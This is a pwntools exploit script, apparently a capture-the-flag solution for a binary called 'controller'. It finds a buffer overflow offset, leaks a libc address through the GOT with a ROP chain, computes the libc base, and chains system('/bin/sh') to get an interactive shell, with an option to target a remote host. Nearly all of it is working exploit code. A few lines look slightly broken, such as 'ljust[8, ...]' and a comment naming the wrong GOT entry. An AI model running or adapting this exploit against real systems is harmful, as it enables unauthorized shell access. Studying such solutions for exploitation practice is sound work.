from pwn import *

# allows you to switch between local/GDB/remote_from_terminal
def start(argv=[], *a, **kw):
	if args.GDB: #Set gdb script
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

def find_ip(payload):
	p = process(exe)
	calc(p)
	p.sendlineafter('>', payload)
	p.wait()
	ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
	info('located EIP/RIP offset at {a}'.format(a=ip_offset))
	return ip_offset

def calc(p):
	p.sendlineafter(': ', '-65338')
	p.sendline('-130676')
	p.sendlineafter('>','2')

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

libc = ELF('/usr/lib/libc.so.6')

exe = './controller'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
libc = ELF('/var/lib/snapd/snap/snapd/11588/lib/x86_64-linux-gnu/libc.so.6')
offset = find_ip(cyclic(1000))

io = start()
rop = ROP(elf)
#execute bash: ropper --file system_drop --search "pop"
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]
syscall = rop.find_gadget(["syscall", "ret"])[0]

#Leak got.alarm with ROP object
rop.raw([pop_rdi, 1, pop_rsi_r15, elf.got.alarm, 0, syscall])
rop.main()
io.sendline(flat({offset: rop.chain()}))
#get our leaked got.write address and format it
got_alarm = unpack(io.recv()[: 6].ljust[8, b"\x00"])
info("leaked got_alarm: %#x", got_alarm)

libc.address = got_alarm - libc.symbols.alarm
info("libc_base: %#x", libc.address)

#/bin/sh using ROP object
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

pprint(rop.dump())
io.sendline(flat({offset: rop.chain()}))
io.interactive()
